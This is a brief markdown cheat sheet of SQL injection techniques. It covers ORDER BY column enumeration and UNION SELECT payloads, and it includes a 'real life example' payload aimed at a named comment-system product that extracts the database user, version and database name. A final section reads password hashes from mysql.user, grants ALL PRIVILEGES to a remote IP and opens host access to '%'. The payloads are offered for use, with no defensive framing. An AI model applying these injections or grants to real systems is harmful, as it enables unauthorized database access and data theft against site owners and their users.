# sql injection

    # getting started
    mysql -v -u root -h localhost -P 3306 -p"Password!" -D dbname -e "show tables;"
    mysql -v -u root -h localhost -P 3306 -p"Password!" -e "use dbname; show tables;"

    # finding the DBMS
    MS-SQL: user_name()
    MySQL: user ()
    ORACLE: select user from dual;

    # finding the number of columns in the table.
    ' ORDER BY 3--     ok
    ' ORDER BY 4--     ok
    ' ORDER BY 5--     output of range

    # union attack to find the number of required elements
    ' UNION SELECT NULL,NULL--                      # no response
    ' UNION SELECT NULL,NULL,NULL,NULL--            # ok => means we need four
    ' UNION SELECT NULL,NULL,NULL,NULL,NYLL--       # no response

    # finding columns with a useful data type
    ' UNION SELECT 'a',NULL,NULL,NULL--
    ' UNION SELECT NULL,'a',NULL,NULL--
    ' UNION SELECT NULL,NULL,'a',NULL--
    ' UNION SELECT NULL,NULL,NULL,'a'-- 

    # real life example - advanced_comment_system
    'UNION SELECT NULL,page,user (),page from advanced_comment_system-- SkrU&del=2

    ' union select user(),2,@@version,database() --

## ERROR 1130 (HY000): Host 'X.X.X.X' is not allowed to connect to this MySQL server

    select Host,User,Password,Insert_priv,ssl_cipher from mysql.user;
    
    use mysql;CREATE USER '<user>'@'<ip>' IDENTIFIED BY 'toto666';"
    use mysql;GRANT ALL PRIVILEGES ON *.* TO '<user>'@'<ip>';
    FLUSH PRIVILEGES;

    UPDATE mysql.user SET Host='%' WHERE Host='localhost' AND User='username';
    UPDATE mysql.db SET Host='%' WHERE Host='localhost' AND User='username';
    FLUSH PRIVILEGES;
